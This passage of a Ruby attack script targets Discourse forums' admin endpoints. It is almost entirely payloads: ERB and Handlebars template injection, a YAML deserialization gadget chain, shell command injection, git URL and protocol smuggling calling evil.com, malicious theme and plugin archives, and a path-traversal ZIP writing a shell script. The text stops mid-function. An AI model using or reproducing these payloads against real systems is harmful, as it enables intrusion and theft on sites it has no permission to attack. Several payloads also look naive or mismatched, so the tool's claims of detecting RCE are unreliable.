#!/usr/bin/env ruby

# Discourse RCE Exploits
# Comprehensive Remote Code Execution testing for Discourse forums
# For educational and authorized testing purposes only
#
# Author: ibrahimsql
# Date: 2025
# Purpose: Educational and authorized penetration testing only
#
# WARNING: Use only on systems you own or have explicit permission to test!

require 'net/http'
require 'uri'
require 'json'
require 'openssl'
require 'base64'
require 'nokogiri'
require 'time'
require 'zip'
require 'tempfile'

class DiscourseRCE
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @timeout = options[:timeout] || 10
    @proxy = options[:proxy]
    @user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    @csrf_token = nil
    @session_cookies = {}
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0
      }
    }
  end

  def run_all_tests
    puts "ðŸš€ Starting Discourse RCE Testing"
    puts "Target: #{@target_url}"
    puts "=" * 60

    # Get CSRF token
    get_csrf_token

    # Test different RCE vectors
    test_theme_rce
    test_plugin_rce
    test_backup_rce
    test_git_rce
    test_template_rce
    test_webhook_rce
    test_api_rce
    test_file_upload_rce

    # Print results
    print_results
    save_results

    @results
  end

  private

  def get_csrf_token
    begin
      uri = URI("#{@target_url}/")
      response = make_request(uri)
      
      if response && response.body
        doc = Nokogiri::HTML(response.body)
        csrf_meta = doc.at_css('meta[name="csrf-token"]')
        @csrf_token = csrf_meta['content'] if csrf_meta
        
        # Extract session cookies
        response.get_fields('set-cookie')&.each do |cookie|
          cookie_parts = cookie.split(';')[0].split('=')
          @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
        end
      end
    rescue => e
      puts "[!] Error getting CSRF token: #{e.message}"
    end
  end

  def test_theme_rce
    puts "[*] Testing theme-based RCE vulnerabilities..."
    
    # Test malicious theme upload
    test_malicious_theme_upload
    
    # Test theme component RCE
    test_theme_component_rce
    
    # Test theme settings RCE
    test_theme_settings_rce
    
    # Test CSS injection RCE
    test_css_injection_rce
  end

  def test_plugin_rce
    puts "[*] Testing plugin-based RCE vulnerabilities..."
    
    # Test plugin upload RCE
    test_plugin_upload_rce
    
    # Test plugin settings RCE
    test_plugin_settings_rce
    
    # Test plugin webhook RCE
    test_plugin_webhook_rce
  end

  def test_backup_rce
    puts "[*] Testing backup-based RCE vulnerabilities..."
    
    # Test backup restore RCE
    test_backup_restore_rce
    
    # Test backup download RCE
    test_backup_download_rce
  end

  def test_git_rce
    puts "[*] Testing Git-based RCE vulnerabilities..."
    
    # Test Git repository import RCE
    test_git_import_rce
    
    # Test Git webhook RCE
    test_git_webhook_rce
  end

  def test_template_rce
    puts "[*] Testing template-based RCE vulnerabilities..."
    
    # Test Handlebars template RCE
    test_handlebars_rce
    
    # Test email template RCE
    test_email_template_rce
    
    # Test custom template RCE
    test_custom_template_rce
  end

  def test_webhook_rce
    puts "[*] Testing webhook-based RCE vulnerabilities..."
    
    # Test webhook payload RCE
    test_webhook_payload_rce
    
    # Test webhook URL RCE
    test_webhook_url_rce
  end

  def test_api_rce
    puts "[*] Testing API-based RCE vulnerabilities..."
    
    # Test API deserialization RCE
    test_api_deserialization_rce
    
    # Test API command injection
    test_api_command_injection
  end

  def test_file_upload_rce
    puts "[*] Testing file upload RCE vulnerabilities..."
    
    # Test executable upload
    test_executable_upload
    
    # Test archive extraction RCE
    test_archive_extraction_rce
    
    # Test image processing RCE
    test_image_processing_rce
  end

  def test_malicious_theme_upload
    begin
      @results[:summary][:total_tests] += 1
      
      # Create malicious theme ZIP
      theme_zip = create_malicious_theme_zip
      
      # Upload theme
      response = upload_theme(theme_zip)
      
      if response && check_rce_success(response, 'theme_upload')
        vulnerability = {
          type: 'Theme Upload RCE',
          severity: 'Critical',
          endpoint: '/admin/themes/import',
          payload: 'Malicious theme with embedded Ruby code',
          method: 'POST',
          test_type: 'theme_upload',
          evidence: extract_rce_evidence(response),
          timestamp: Time.now.iso8601
        }
        
        @results[:vulnerable] = true
        @results[:vulnerabilities] << vulnerability
        @results[:summary][:successful_tests] += 1
        @results[:summary][:critical_vulns] += 1
        
        puts "[+] Theme upload RCE found!"
      end
      
    rescue => e
      puts "[!] Error testing theme upload RCE: #{e.message}"
    ensure
      theme_zip&.close
      theme_zip&.unlink
    end
  end

  def test_theme_component_rce
    begin
      @results[:summary][:total_tests] += 1
      
      rce_payloads = [
        # Ruby code injection
        "<%= system('id') %>",
        "<%= `whoami` %>",
        "<%= eval('system(\"id\")') %>",
        "<%= File.read('/etc/passwd') %>",
        
        # JavaScript RCE (Node.js)
        "<script>require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout); });</script>",
        "<script>global.process.mainModule.require('child_process').execSync('id').toString()</script>",
        
        # Template injection
        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
      ]
      
      rce_payloads.each do |payload|
        # Test in theme component
        component_data = {
          'theme_field[type_id]' => '0',
          'theme_field[name]' => 'head_tag',
          'theme_field[value]' => payload
        }
        
        response = make_post_request("#{@target_url}/admin/themes/1/theme_fields", component_data)
        
        if response && check_rce_success(response, 'theme_component')
          vulnerability = {
            type: 'Theme Component RCE',
            severity: 'Critical',
            endpoint: '/admin/themes/1/theme_fields',
            payload: payload,
            method: 'POST',
            test_type: 'theme_component',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:critical_vulns] += 1
          
          puts "[+] Theme component RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing theme component RCE: #{e.message}"
    end
  end

  def test_theme_settings_rce
    begin
      @results[:summary][:total_tests] += 1
      
      settings_payloads = [
        "<%= system('id') %>",
        "#{`whoami`}",
        "<%= File.read('/etc/passwd') %>",
        "<%= eval('system(\"id\")') %>"
      ]
      
      settings_payloads.each do |payload|
        settings_data = {
          'theme[settings][custom_setting]' => payload
        }
        
        response = make_put_request("#{@target_url}/admin/themes/1", settings_data)
        
        if response && check_rce_success(response, 'theme_settings')
          vulnerability = {
            type: 'Theme Settings RCE',
            severity: 'Critical',
            endpoint: '/admin/themes/1',
            payload: payload,
            method: 'PUT',
            test_type: 'theme_settings',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:critical_vulns] += 1
          
          puts "[+] Theme settings RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing theme settings RCE: #{e.message}"
    end
  end

  def test_css_injection_rce
    begin
      @results[:summary][:total_tests] += 1
      
      css_payloads = [
        # CSS with Ruby injection
        "body:before { content: '<%= system(\"id\") %>'; }",
        "@import url('data:text/css,<%= `whoami` %>');",
        
        # CSS with JavaScript
        "body { background: url('javascript:eval(String.fromCharCode(114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,105,100,39,41))'); }"
      ]
      
      css_payloads.each do |payload|
        css_data = {
          'theme_field[type_id]' => '1',
          'theme_field[name]' => 'scss',
          'theme_field[value]' => payload
        }
        
        response = make_post_request("#{@target_url}/admin/themes/1/theme_fields", css_data)
        
        if response && check_rce_success(response, 'css_injection')
          vulnerability = {
            type: 'CSS Injection RCE',
            severity: 'High',
            endpoint: '/admin/themes/1/theme_fields',
            payload: payload,
            method: 'POST',
            test_type: 'css_injection',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:high_vulns] += 1
          
          puts "[+] CSS injection RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing CSS injection RCE: #{e.message}"
    end
  end

  def test_plugin_upload_rce
    begin
      @results[:summary][:total_tests] += 1
      
      # Create malicious plugin
      plugin_zip = create_malicious_plugin_zip
      
      # Upload plugin
      response = upload_plugin(plugin_zip)
      
      if response && check_rce_success(response, 'plugin_upload')
        vulnerability = {
          type: 'Plugin Upload RCE',
          severity: 'Critical',
          endpoint: '/admin/plugins/upload',
          payload: 'Malicious plugin with embedded Ruby code',
          method: 'POST',
          test_type: 'plugin_upload',
          evidence: extract_rce_evidence(response),
          timestamp: Time.now.iso8601
        }
        
        @results[:vulnerable] = true
        @results[:vulnerabilities] << vulnerability
        @results[:summary][:successful_tests] += 1
        @results[:summary][:critical_vulns] += 1
        
        puts "[+] Plugin upload RCE found!"
      end
      
    rescue => e
      puts "[!] Error testing plugin upload RCE: #{e.message}"
    ensure
      plugin_zip&.close
      plugin_zip&.unlink
    end
  end

  def test_plugin_settings_rce
    begin
      @results[:summary][:total_tests] += 1
      
      plugin_payloads = [
        "<%= system('id') %>",
        "#{`whoami`}",
        "<%= File.read('/etc/passwd') %>",
        "<%= eval('system(\"id\")') %>"
      ]
      
      plugin_payloads.each do |payload|
        settings_data = {
          'plugin_setting[value]' => payload
        }
        
        response = make_put_request("#{@target_url}/admin/plugins/discourse-chat/settings", settings_data)
        
        if response && check_rce_success(response, 'plugin_settings')
          vulnerability = {
            type: 'Plugin Settings RCE',
            severity: 'Critical',
            endpoint: '/admin/plugins/discourse-chat/settings',
            payload: payload,
            method: 'PUT',
            test_type: 'plugin_settings',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:critical_vulns] += 1
          
          puts "[+] Plugin settings RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing plugin settings RCE: #{e.message}"
    end
  end

  def test_plugin_webhook_rce
    begin
      @results[:summary][:total_tests] += 1
      
      webhook_payloads = [
        # Ruby deserialization
        "--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\nio: x\n--- !ruby/object:Net::BufferedIO\nio: x\ndebug_output: &1 !!ruby/object:Net::WriteAdapter\nsocket: &1 !!ruby/object:Gem::RequestSet\nsets: x\ngit_set: x\nvendor_set: x\ngem_list: x\ninstall_dir: \"| id\"\n",
        
        # Command injection
        "; id; echo",
        "| id",
        "&& id",
        "$(id)",
        "`id`",
        
        # Template injection
        "<%= system('id') %>",
        "#{`whoami`}"
      ]
      
      webhook_payloads.each do |payload|
        webhook_data = {
          'webhook[payload_url]' => "http://evil.com/#{payload}",
          'webhook[content_type]' => 'application/json',
          'webhook[secret]' => payload
        }
        
        response = make_post_request("#{@target_url}/admin/api/web_hooks", webhook_data)
        
        if response && check_rce_success(response, 'plugin_webhook')
          vulnerability = {
            type: 'Plugin Webhook RCE',
            severity: 'Critical',
            endpoint: '/admin/api/web_hooks',
            payload: payload,
            method: 'POST',
            test_type: 'plugin_webhook',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:critical_vulns] += 1
          
          puts "[+] Plugin webhook RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing plugin webhook RCE: #{e.message}"
    end
  end

  def test_backup_restore_rce
    begin
      @results[:summary][:total_tests] += 1
      
      # Create malicious backup
      backup_file = create_malicious_backup
      
      # Upload and restore backup
      response = restore_backup(backup_file)
      
      if response && check_rce_success(response, 'backup_restore')
        vulnerability = {
          type: 'Backup Restore RCE',
          severity: 'Critical',
          endpoint: '/admin/backups/upload',
          payload: 'Malicious backup with embedded code',
          method: 'POST',
          test_type: 'backup_restore',
          evidence: extract_rce_evidence(response),
          timestamp: Time.now.iso8601
        }
        
        @results[:vulnerable] = true
        @results[:vulnerabilities] << vulnerability
        @results[:summary][:successful_tests] += 1
        @results[:summary][:critical_vulns] += 1
        
        puts "[+] Backup restore RCE found!"
      end
      
    rescue => e
      puts "[!] Error testing backup restore RCE: #{e.message}"
    ensure
      backup_file&.close
      backup_file&.unlink
    end
  end

  def test_backup_download_rce
    begin
      @results[:summary][:total_tests] += 1
      
      download_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "; id; echo",
        "| id",
        "$(id)",
        "`id`"
      ]
      
      download_payloads.each do |payload|
        download_url = "#{@target_url}/admin/backups/#{URI.encode_www_form_component(payload)}/download"
        response = make_request(URI(download_url))
        
        if response && check_rce_success(response, 'backup_download')
          vulnerability = {
            type: 'Backup Download RCE',
            severity: 'High',
            endpoint: '/admin/backups/*/download',
            payload: payload,
            method: 'GET',
            test_type: 'backup_download',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:high_vulns] += 1
          
          puts "[+] Backup download RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing backup download RCE: #{e.message}"
    end
  end

  def test_git_import_rce
    begin
      @results[:summary][:total_tests] += 1
      
      git_payloads = [
        # Git URL injection
        "git://evil.com/repo.git; id; echo",
        "https://evil.com/repo.git| id",
        "ssh://git@evil.com/repo.git && id",
        
        # Git hooks
        "https://evil.com/repo.git#post-receive=id",
        
        # Git protocol smuggling
        "ext::sh -c 'id'% ",
        "fd::17/path/to/repo"
      ]
      
      git_payloads.each do |payload|
        git_data = {
          'remote' => payload,
          'branch' => 'master'
        }
        
        response = make_post_request("#{@target_url}/admin/themes/import", git_data)
        
        if response && check_rce_success(response, 'git_import')
          vulnerability = {
            type: 'Git Import RCE',
            severity: 'Critical',
            endpoint: '/admin/themes/import',
            payload: payload,
            method: 'POST',
            test_type: 'git_import',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:critical_vulns] += 1
          
          puts "[+] Git import RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing Git import RCE: #{e.message}"
    end
  end

  def test_git_webhook_rce
    begin
      @results[:summary][:total_tests] += 1
      
      webhook_payloads = [
        "; id; echo",
        "| id",
        "&& id",
        "$(id)",
        "`id`"
      ]
      
      webhook_payloads.each do |payload|
        webhook_data = {
          'web_hook[payload_url]' => "https://evil.com/webhook#{payload}",
          'web_hook[content_type]' => 'application/json'
        }
        
        response = make_post_request("#{@target_url}/admin/api/web_hooks", webhook_data)
        
        if response && check_rce_success(response, 'git_webhook')
          vulnerability = {
            type: 'Git Webhook RCE',
            severity: 'High',
            endpoint: '/admin/api/web_hooks',
            payload: payload,
            method: 'POST',
            test_type: 'git_webhook',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:high_vulns] += 1
          
          puts "[+] Git webhook RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing Git webhook RCE: #{e.message}"
    end
  end

  def test_handlebars_rce
    begin
      @results[:summary][:total_tests] += 1
      
      handlebars_payloads = [
        # Handlebars prototype pollution
        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
        
        # Handlebars helper injection
        "{{lookup (lookup this 'constructor') 'constructor' 'return require(\"child_process\").execSync(\"id\");'}}",
        
        # Ruby ERB injection
        "<%= system('id') %>",
        "<%= `whoami` %>",
        "<%= File.read('/etc/passwd') %>"
      ]
      
      handlebars_payloads.each do |payload|
        template_data = {
          'email_template[body]' => payload,
          'email_template[subject]' => 'Test'
        }
        
        response = make_put_request("#{@target_url}/admin/customize/email_templates/test", template_data)
        
        if response && check_rce_success(response, 'handlebars')
          vulnerability = {
            type: 'Handlebars Template RCE',
            severity: 'Critical',
            endpoint: '/admin/customize/email_templates/test',
            payload: payload,
            method: 'PUT',
            test_type: 'handlebars',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:critical_vulns] += 1
          
          puts "[+] Handlebars template RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing Handlebars RCE: #{e.message}"
    end
  end

  def test_email_template_rce
    begin
      @results[:summary][:total_tests] += 1
      
      email_payloads = [
        "<%= system('id') %>",
        "<%= `whoami` %>",
        "<%= File.read('/etc/passwd') %>",
        "<%= eval('system(\"id\")') %>",
        "#{`id`}"
      ]
      
      email_payloads.each do |payload|
        template_data = {
          'email_template[body]' => payload,
          'email_template[subject]' => payload
        }
        
        response = make_put_request("#{@target_url}/admin/customize/email_templates/user_notifications.digest", template_data)
        
        if response && check_rce_success(response, 'email_template')
          vulnerability = {
            type: 'Email Template RCE',
            severity: 'Critical',
            endpoint: '/admin/customize/email_templates/user_notifications.digest',
            payload: payload,
            method: 'PUT',
            test_type: 'email_template',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:critical_vulns] += 1
          
          puts "[+] Email template RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing email template RCE: #{e.message}"
    end
  end

  def test_custom_template_rce
    begin
      @results[:summary][:total_tests] += 1
      
      custom_payloads = [
        "<%= system('id') %>",
        "<%= `whoami` %>",
        "<%= File.read('/etc/passwd') %>",
        "<%= eval('system(\"id\")') %>"
      ]
      
      custom_payloads.each do |payload|
        template_data = {
          'site_text[value]' => payload
        }
        
        response = make_put_request("#{@target_url}/admin/customize/site_texts/js.composer.reply", template_data)
        
        if response && check_rce_success(response, 'custom_template')
          vulnerability = {
            type: 'Custom Template RCE',
            severity: 'High',
            endpoint: '/admin/customize/site_texts/js.composer.reply',
            payload: payload,
            method: 'PUT',
            test_type: 'custom_template',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:high_vulns] += 1
          
          puts "[+] Custom template RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing custom template RCE: #{e.message}"
    end
  end

  def test_webhook_payload_rce
    begin
      @results[:summary][:total_tests] += 1
      
      payload_rce = [
        # Ruby deserialization
        "--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\nio: x\n--- !ruby/object:Net::BufferedIO\nio: x\ndebug_output: &1 !!ruby/object:Net::WriteAdapter\nsocket: &1 !!ruby/object:Gem::RequestSet\nsets: x\ngit_set: x\nvendor_set: x\ngem_list: x\ninstall_dir: \"| id\"\n",
        
        # JSON injection
        '{"test": "<%= system(\'id\') %>"}',
        '{"test": "#{`whoami`}"}',
        
        # YAML injection
        "test: <%= system('id') %>",
        "test: #{`whoami`}"
      ]
      
      payload_rce.each do |payload|
        webhook_data = {
          'web_hook[payload_url]' => 'https://evil.com/webhook',
          'web_hook[content_type]' => 'application/json',
          'web_hook[secret]' => payload
        }
        
        response = make_post_request("#{@target_url}/admin/api/web_hooks", webhook_data)
        
        if response && check_rce_success(response, 'webhook_payload')
          vulnerability = {
            type: 'Webhook Payload RCE',
            severity: 'Critical',
            endpoint: '/admin/api/web_hooks',
            payload: payload,
            method: 'POST',
            test_type: 'webhook_payload',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:critical_vulns] += 1
          
          puts "[+] Webhook payload RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing webhook payload RCE: #{e.message}"
    end
  end

  def test_webhook_url_rce
    begin
      @results[:summary][:total_tests] += 1
      
      url_payloads = [
        "https://evil.com/webhook; id; echo",
        "https://evil.com/webhook| id",
        "https://evil.com/webhook && id",
        "https://evil.com/webhook$(id)",
        "https://evil.com/webhook`id`"
      ]
      
      url_payloads.each do |payload|
        webhook_data = {
          'web_hook[payload_url]' => payload,
          'web_hook[content_type]' => 'application/json'
        }
        
        response = make_post_request("#{@target_url}/admin/api/web_hooks", webhook_data)
        
        if response && check_rce_success(response, 'webhook_url')
          vulnerability = {
            type: 'Webhook URL RCE',
            severity: 'High',
            endpoint: '/admin/api/web_hooks',
            payload: payload,
            method: 'POST',
            test_type: 'webhook_url',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:high_vulns] += 1
          
          puts "[+] Webhook URL RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing webhook URL RCE: #{e.message}"
    end
  end

  def test_api_deserialization_rce
    begin
      @results[:summary][:total_tests] += 1
      
      deserialization_payloads = [
        # Ruby Marshal
        Base64.encode64("\x04\x08o:\x0bObject\x00"),
        
        # YAML deserialization
        "--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\nio: x\n--- !ruby/object:Net::BufferedIO\nio: x\ndebug_output: &1 !!ruby/object:Net::WriteAdapter\nsocket: &1 !!ruby/object:Gem::RequestSet\nsets: x\ngit_set: x\nvendor_set: x\ngem_list: x\ninstall_dir: \"| id\"\n"
      ]
      
      deserialization_payloads.each do |payload|
        api_data = {
          'data' => payload
        }
        
        response = make_post_request("#{@target_url}/admin/api/keys", api_data)
        
        if response && check_rce_success(response, 'api_deserialization')
          vulnerability = {
            type: 'API Deserialization RCE',
            severity: 'Critical',
            endpoint: '/admin/api/keys',
            payload: payload,
            method: 'POST',
            test_type: 'api_deserialization',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:critical_vulns] += 1
          
          puts "[+] API deserialization RCE found!"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing API deserialization RCE: #{e.message}"
    end
  end

  def test_api_command_injection
    begin
      @results[:summary][:total_tests] += 1
      
      command_payloads = [
        "; id; echo",
        "| id",
        "&& id",
        "$(id)",
        "`id`",
        "\n id \n"
      ]
      
      api_endpoints = [
        '/admin/api/keys',
        '/admin/users',
        '/admin/backups',
        '/admin/plugins'
      ]
      
      api_endpoints.each do |endpoint|
        command_payloads.each do |payload|
          api_data = {
            'description' => payload,
            'username' => payload,
            'filename' => payload,
            'name' => payload
          }
          
          response = make_post_request("#{@target_url}#{endpoint}", api_data)
          
          if response && check_rce_success(response, 'api_command_injection')
            vulnerability = {
              type: 'API Command Injection RCE',
              severity: 'Critical',
              endpoint: endpoint,
              payload: payload,
              method: 'POST',
              test_type: 'api_command_injection',
              evidence: extract_rce_evidence(response),
              timestamp: Time.now.iso8601
            }
            
            @results[:vulnerable] = true
            @results[:vulnerabilities] << vulnerability
            @results[:summary][:successful_tests] += 1
            @results[:summary][:critical_vulns] += 1
            
            puts "[+] API command injection RCE found!"
          end
          
          sleep(0.3)
        end
      end
      
    rescue => e
      puts "[!] Error testing API command injection RCE: #{e.message}"
    end
  end

  def test_executable_upload
    begin
      @results[:summary][:total_tests] += 1
      
      # Create executable files
      executables = {
        'shell.sh' => "#!/bin/bash\nid\nwhoami\n",
        'script.rb' => "system('id')\nputs `whoami`\n",
        'script.py' => "import os\nos.system('id')\n",
        'script.php' => "<?php system('id'); ?>\n"
      }
      
      executables.each do |filename, content|
        response = upload_file(filename, content, 'application/octet-stream')
        
        if response && check_rce_success(response, 'executable_upload')
          vulnerability = {
            type: 'Executable Upload RCE',
            severity: 'Critical',
            endpoint: '/uploads',
            payload: "#{filename} with executable content",
            method: 'POST',
            test_type: 'executable_upload',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:critical_vulns] += 1
          
          puts "[+] Executable upload RCE found: #{filename}"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing executable upload RCE: #{e.message}"
    end
  end

  def test_archive_extraction_rce
    begin
      @results[:summary][:total_tests] += 1
      
      # Create malicious ZIP with path traversal
      zip_file = create_malicious_zip
      
      response = upload_file('malicious.zip', zip_file.read, 'application/zip')
      
      if response && check_rce_success(response, 'archive_extraction')
        vulnerability = {
          type: 'Archive Extraction RCE',
          severity: 'Critical',
          endpoint: '/uploads',
          payload: 'Malicious ZIP with path traversal and executable',
          method: 'POST',
          test_type: 'archive_extraction',
          evidence: extract_rce_evidence(response),
          timestamp: Time.now.iso8601
        }
        
        @results[:vulnerable] = true
        @results[:vulnerabilities] << vulnerability
        @results[:summary][:successful_tests] += 1
        @results[:summary][:critical_vulns] += 1
        
        puts "[+] Archive extraction RCE found!"
      end
      
    rescue => e
      puts "[!] Error testing archive extraction RCE: #{e.message}"
    ensure
      zip_file&.close
      zip_file&.unlink
    end
  end

  def test_image_processing_rce
    begin
      @results[:summary][:total_tests] += 1
      
      # Create malicious image with embedded code
      malicious_images = {
        'exploit.svg' => create_malicious_svg,
        'exploit.gif' => create_malicious_gif
      }
      
      malicious_images.each do |filename, content|
        response = upload_file(filename, content, 'image/svg+xml')
        
        if response && check_rce_success(response, 'image_processing')
          vulnerability = {
            type: 'Image Processing RCE',
            severity: 'High',
            endpoint: '/uploads',
            payload: "#{filename} with embedded code",
            method: 'POST',
            test_type: 'image_processing',
            evidence: extract_rce_evidence(response),
            timestamp: Time.now.iso8601
          }
          
          @results[:vulnerable] = true
          @results[:vulnerabilities] << vulnerability
          @results[:summary][:successful_tests] += 1
          @results[:summary][:high_vulns] += 1
          
          puts "[+] Image processing RCE found: #{filename}"
        end
        
        sleep(0.5)
      end
      
    rescue => e
      puts "[!] Error testing image processing RCE: #{e.message}"
    end
  end

  # Helper methods for creating malicious files
  
  def create_malicious_theme_zip
    zip_file = Tempfile.new(['malicious_theme', '.zip'])
    
    Zip::File.open(zip_file.path, Zip::File::CREATE) do |zipfile|
      # Add theme metadata
      zipfile.get_output_stream('about.json') do |f|
        f.puts '{
  "name": "Malicious Theme",
  "about_url": "https://evil.com",
  "license_url": "https://evil.com"
}'
      end
      
      # Add malicious Ruby code
      zipfile.get_output_stream('common/head_tag.html') do |f|
        f.puts '<%= system("id") %>'
        f.puts '<script>alert("RCE via theme")</script>'
      end
      
      # Add malicious CSS
      zipfile.get_output_stream('common/common.scss') do |f|
        f.puts 'body:before { content: "<%= `whoami` %>"; }'
      end
      
      # Add malicious JavaScript
      zipfile.get_output_stream('javascripts/discourse/initializers/malicious.js.es6') do |f|
        f.puts 'export default {'
        f.puts '  name: "malicious",'
        f.puts '  initialize() {'
        f.puts '    console.log("<%= system(\'id\') %>");'
        f.puts '  }'
        f.puts '};'
      end
    end
    
    zip_file
  end
  
  def create_malicious_plugin_zip
    zip_file = Tempfile.new(['malicious_plugin', '.zip'])
    
    Zip::File.open(zip_file.path, Zip::File::CREATE) do |zipfile|
      # Add plugin metadata
      zipfile.get_output_stream('plugin.rb') do |f|
        f.puts '# name: malicious-plugin'
        f.puts '# about: A malicious plugin'
        f.puts '# version: 1.0'
        f.puts '# author: Evil'
        f.puts ''
        f.puts 'system("id")'
        f.puts '`whoami`'
      end
      
      # Add malicious initializer
      zipfile.get_output_stream('assets/javascripts/initializers/malicious.js.es6') do |f|
        f.puts 'export default {'
        f.puts '  name: "malicious",'
        f.puts '  initialize() {'
        f.puts '    eval("<%= system(\'id\') %>");'
        f.puts '  }'
        f.puts '};'
      end
    end
    
    zip_file
  end
  
  def create_malicious_backup
    backup_file = Tempfile.new(['malicious_backup', '.tar.gz'])
    
    # Create a simple malicious backup structure
    backup_file.write("malicious backup content with <%= system('id') %>")
    backup_file.rewind
    
    backup_file
  end
  
  def create_malicious_zip
    zip_file = Tempfile.new(['malicious', '.zip'])
    
    Zip::File.open(zip_file.path, Zip::File::CREATE) do |zipfile|
      # Path traversal with executable
      zipfile.get_output_stream('../../../tmp/evil.sh') do |f|
        f.puts '#!/bin/bash'
        f.puts 'id'
        f.puts 'whoami'
      end
      
      # Malicious file
